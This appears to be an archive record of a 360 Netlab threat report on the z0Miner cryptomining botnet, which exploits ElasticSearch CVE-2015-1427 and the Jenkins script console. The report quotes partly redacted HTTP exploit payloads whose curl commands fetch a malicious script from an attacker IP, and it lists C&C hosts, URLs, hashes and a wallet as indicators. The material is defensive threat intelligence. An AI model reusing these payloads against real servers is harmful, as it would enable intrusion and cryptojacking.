{
    "id": "7b4ddce0-6fb2-471d-a263-afc9d31711ee",
    "created_at": "2023-01-12T14:59:13.748253Z",
    "updated_at": "2025-03-27T02:09:07.801233Z",
    "deleted_at": null,
    "sha1_hash": "0f93147df483ea3eb02b0fa7268f8d23c6d0b051",
    "title": "2021-03-09 - Threat Alert- z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities",
    "authors": "",
    "file_creation_date": "2022-05-28T03:35:11Z",
    "file_modification_date": "2022-05-28T03:35:11Z",
    "file_size": 177522,
    "plain_text": "# Threat Alert: z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities\n\n**[blog.netlab.360.com/threat-alert-z0miner-is-spreading-quickly-by-exploiting-elasticsearch-and-jenkins-vulnerabilities/](https://blog.netlab.360.com/threat-alert-z0miner-is-spreading-quickly-by-exploiting-elasticsearch-and-jenkins-vulnerabilities/)**\n\nJiaYu March 8, 2021\n\n8 March 2021 / [Botnet](https://blog.netlab.360.com/tag/botnet/)\n\n## Overview\n\nIn recent months, with the huge rise of Bitcoin and Monroe, various mining botnet have\nkicked into high gear, and our BotMon system detects dozens of mining Botnet attacks pretty\nmuch every day, most of them are old families, some just changed their wallets or\npropagation methods, and z0Miner is one of them.\n\nz0Miner is a malicious mining family that became active last year and has been publicly\n[analyzed by the Tencent Security Team. z0Miner was initially active when it exploited the](https://s.tencent.com/research/report/1170.html)\nWeblogic unauthorized remote command execution vulnerability for propagation.\n\nRecently, our Anglerfish honeypot system captured that z0Miner was also spreading by\nexploiting remote command execution vulnerabilities in ElasticSearch and Jenkins, with the\nfollowing recent active trends.\n\nz0Miner recent active trends\n\n## Vulnerability exploit\n\n### ElasticSearch RCE vulnerability CVE-2015-1427\n\nAlthough it is an old vulnerability from 2015, z0Miner is still using it. The vulnerability exploit\nPayload is as follows (key details have been omitted).\n\n\n-----\n\n```\nPOST /{VULN_URI} HTTP/1.1\nHost: {target}:{port}\n{...exec(\\\"curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\\\")...}\n\n### Jenkins script console RCE vulnerability\n\n```\nThis vulnerability was exposed a bit earlier than CVE-2015-1427 above, and the\ncorresponding z0Miner Payload is\n```\nPOST /{VULN_URI} HTTP/1.1\nHost: {target}:{port}\ncurl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+o+%2Ftmp%2Fsolr%22.execute%28%29.text&json=%7B%22script%22%3A+%22println+%5C%22curl+fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&Submit=Run\n\n## Sample Analysis\n\n### Initial Shell Script\n\n```\nThe core logic of the Payloads exploited by the above two vulnerabilities is to download\n```\nhxxp://27.1.1.34:8080/docs/conf.txt and execute it. This file is a malicious shell\n\n```\nscript that corresponds to z0Miner's earlier z0.txt. The logic is essentially the same as in the\nearlier z0.txt\n\n1. Kill the competitor\n2. Setting up Cron\n3. Download & execute the mining programs\n\n### Cron\n\nAs in the early days, z0Miner will still download and execute malicious scripts on Pastebin\nperiodically by setting up Cron tasks, the latest malicious script URLs are as follows.\n```\nhxxps://pastebin.com/raw/4rb51qKW\nhxxps://pastebin.com/raw/bwD1BCXt\n\n```\nCurrently, the script downloaded from the above URL only contains an `exit command, and`\nmore malicious actions probably will be added in the future.\n\n### Mining\n\nAfter killing competitors and setting up crontab, conf.txt will download the mining kit from the\nfollowing 3 URLs and start mining.\n\n\n-----\n\n```\nhxxp://27.1.1.34:8080/docs/config.json   > Mining Config file\nhxxp://178.62.202.152:8080/Wuck/java.exe  --> XMRig Miner\nhxxp://27.1.1.34:8080/docs/solr.sh     --> Miner Starter Shell script file\n\n```\nThe solr.sh file is a shell script file dedicated to killing more competitors and starting the\nmining program.\n\nThe XMR Wallet in the config.json file differs from the earlier z0Miner Wallet:\n```\n49r6Mp1fcb4fUT5FPTgaz9E47fZV7n6JiY76c4vdBZvgDm8GmWHTVYM9Azpe4MsA9oXs2RpUNPPfH7oXABr3Qn\n\n```\nAnd now reads over 22 XMRs have been mined so far.\n\n### Contact us\n\n[Readers are always welcomed to reach us on twitter, or email to netlab at 360](https://twitter.com/360Netlab)\n\ndot cn.\n\n## IoC\n\n### C&C\n```\n27.1.1.34:8080      Republic_of_Korea|Seoul           \nASN9943|KangNam_CableTV\n178.62.202.152:8080  Netherlands|North_Holland|Amsterdam  ASN14061|DigitalOcean\n\n URL\nhxxp://27.1.1.34:8080/docs/conf.txt\nhxxps://pastebin.com/raw/4rb51qKW\nhxxps://pastebin.com/raw/bwD1BCXt\nhxxp://27.1.1.34:8080/docs/config.json\nhxxp://178.62.202.152:8080/Wuck/java.exe\nhxxp://178.62.202.152:8080/Wuck/xmrig.exe\nhxxp://27.1.1.34:8080/docs/solr.sh\n\n MD5\n\n```\n\n-----\n\n```\n84417ff134484bb8ce4ff567574beaa5\nc1dcc75d729e31833892cb649f450568\nadb190c4e90cc61ca266cfda355826df\nd833fc2ced5d0791a404ced14ecf4e20\n26a91e9a94c7f8d966de1541095a3d92\n373b018bef17e04d8ff29472390403f9\n\n### XRM Wallet\n49r6Mp1fcb4fUT5FPTgaz9E47fZV7n6JiY76c4vdBZvgDm8GmWHTVYM9Azpe4MsA9oXs2RpUNPPfH7oXABr3Qn\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-09 - Threat Alert- z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities.pdf"
    ],
    "report_names": [
        "2021-03-09 - Threat Alert- z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535553,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653708911,
    "ts_modification_date": 1653708911,
    "files": {
        "pdf": "https://archive.orkl.eu/0f93147df483ea3eb02b0fa7268f8d23c6d0b051.pdf",
        "text": "https://archive.orkl.eu/0f93147df483ea3eb02b0fa7268f8d23c6d0b051.txt",
        "img": "https://archive.orkl.eu/0f93147df483ea3eb02b0fa7268f8d23c6d0b051.jpg"
    }
}